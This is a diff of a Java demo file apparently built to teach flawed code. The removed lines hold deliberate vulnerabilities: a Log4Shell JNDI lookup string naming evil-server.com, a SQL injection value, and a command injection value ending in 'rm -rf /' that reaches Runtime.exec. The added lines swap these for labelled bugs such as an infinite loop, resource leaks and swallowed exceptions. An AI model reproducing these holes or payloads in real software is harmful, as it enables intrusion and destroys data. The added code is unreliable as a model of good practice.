@@ -1,78 +1,85 @@
 package com.example;
 
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.sql.Connection;
-import java.sql.DriverManager;
-import java.sql.ResultSet;
-import java.sql.Statement;
+import java.io.FileReader;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.List;
 
 public class App {
 
-    // VULNERABILITY: Using a vulnerable logging framework version (Log4Shell)
-    private static final Logger logger = LogManager.getLogger(App.class);
+    // ISSUE 1: Public, mutable global state accessible by any thread
+    public static List<String> globalDataLeak = new ArrayList<String>();
+    
+    // ISSUE 2: Thread-unsafe counter accessed by concurrent operations without synchronization
+    public static int unsafeCounter = 0;
 
     public static void main(String[] args) {
-        System.out.println("[⚠️] Starting App with Intentional Vulnerabilities...\n");
+        System.out.println("Starting highly unstable application...");
 
-        // Simulating untrusted user inputs
-        String maliciousLogInput = "${jndi:ldap://://evil-server.com}";
-        String maliciousQueryInput = "admin' OR '1'='1";
-        String maliciousCommandInput = "local-ping; rm -rf /"; 
-
-        // 1. Log4Shell Demonstration
-        // Logging user-controlled strings directly allows JNDI lookups in this Log4j version
-        logger.info("Processing user input: " + maliciousLogInput);
-
-        // 2. SQL Injection Demonstration
-        executeVulnerableQuery(maliciousQueryInput);
-
-        // 3. Command Injection Demonstration
-        executeVulnerableCommand(maliciousCommandInput);
-    }
-
-    /**
-     * VULNERABILITY: SQL Injection
-     * Direct string concatenation allows an attacker to alter the SQL command structure.
-     */
-    private static void executeVulnerableQuery(String userInput) {
-        String url = "jdbc:h2:mem:test;DB_CLOSE_DELAY=-1";
-        try (Connection conn = DriverManager.getConnection(url, "sa", "");
-             Statement stmt = conn.createStatement()) {
-            
-            // Faulty practice: concatenation instead of PreparedStatement
-            String query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = 'password'";
-            System.out.println("[Executing SQL]: " + query);
-            
-            ResultSet rs = stmt.executeQuery(query);
-            while (rs.next()) {
-                System.out.println("User found: " + rs.getString("username"));
-            }
+        // ISSUE 3: Silent failure via an empty catch block (Swallowed Exception)
+        try {
+            triggerMemoryLeak();
+            readFileWithoutClosing();
         } catch (Exception e) {
-            System.err.println("SQL Error: " + e.getMessage());
+            // Broken practice: No logging, no rethrowing, app proceeds blindly
+        }
+
+        // ISSUE 4: Infinite loop that will lock up CPU cores
+        while (true) {
+            unsafeCounter++;
+            if (unsafeCounter < 0) { // Will eventually overflow and trigger, but poorly designed
+                break;
+            }
         }
     }
 
     /**
-     * VULNERABILITY: OS Command Injection
-     * Passing unsanitized user inputs into a system shell executor.
+     * ISSUE 5: Permanent Memory Leak (OutMemoryError waiting to happen)
+     * Appends to a global static list continuously without clearing it.
      */
-    private static void executeVulnerableCommand(String userInput) {
-        // Faulty practice: Constructing OS commands natively with user variables
-        String command = "ping -c 1 " + userInput;
-        System.out.println("[Executing OS Command]: " + command);
+    private static void triggerMemoryLeak() {
+        for (int i = 0; i < 100000; i++) {
+            // Strings generated dynamically stay in memory because the static list reference never dies
+            globalDataLeak.add("Leak payload data string number: " + i);
+        }
+    }
 
+    /**
+     * ISSUE 6: Unclosed Resource Leak
+     * Opens a file stream without using try-with-resources or a finally block, exhausting file descriptors.
+     */
+    private static void readFileWithoutClosing() throws IOException {
+        // Bad practice: If an exception occurs, or even on success, the file handle remains locked
+        FileReader reader = new FileReader("config.txt");
+        int data = reader.read();
+        System.out.println("Data byte: " + data);
+        // Explicitly missing: reader.close();
+    }
+
+    /**
+     * ISSUE 7: Bad Performance and Object Churn
+     * Mutating immutable strings inside a tight loop instead of using StringBuilder.
+     */
+    private static String heavyStringChurn() {
+        String result = "";
+        for (int i = 0; i < 5000; i++) {
+            // Bad practice: Creates 5,000 temporary String objects on the heap
+            result += "line" + i; 
+        }
+        return result;
+    }
+
+    /**
+     * ISSUE 8: Return inside a finally block
+     * This suppresses any exception thrown in the try block, altering logical execution flow.
+     */
+    @SuppressWarnings("finally")
+    private static int dangerousFlow() {
         try {
-            Process process = Runtime.getRuntime().exec(command);
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            String line;
-            while ((line = reader.readLine()) != null) {
-                System.out.println(line);
-            }
-        } catch (Exception e) {
-            System.err.println("Command Executive Error: " + e.getMessage());
+            throw new RuntimeException("Critical Database Failure!");
+        } finally {
+            // Bad practice: Masking the runtime exception by returning a value anyway
+            return 1; 
         }
     }
 }
